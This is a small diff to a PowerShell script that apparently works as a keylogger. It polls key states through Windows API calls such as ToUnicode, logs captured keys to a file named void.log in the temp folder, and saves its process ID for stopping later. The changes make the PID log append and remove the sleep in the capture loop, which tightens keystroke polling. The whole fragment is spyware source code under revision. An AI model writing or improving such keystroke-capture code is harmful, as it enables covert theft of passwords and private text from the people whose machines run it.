@@ -35,7 +35,7 @@ function Keystrokes()
 {
    [int]$totalNumber = 0
    $Path = "$Env:TMP\void.log"
-   echo $pid > $Env:TMP\pid.log #Store Process PID to be abble to stop it later
+   echo $pid >> $Env:TMP\pid.log #Store Process PID to be abble to stop it later
 
 
 #API Calls
@@ -69,7 +69,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       # collect pressed keys, CTRL+C to exit
       While($true)
       {
-         Start-Sleep -Milliseconds 20
+         #Start-Sleep -Milliseconds 20
          #Scan  ASCII codes between 8 and 129
          For($ascii = 9; $ascii -le 128; $ascii++) 
          {
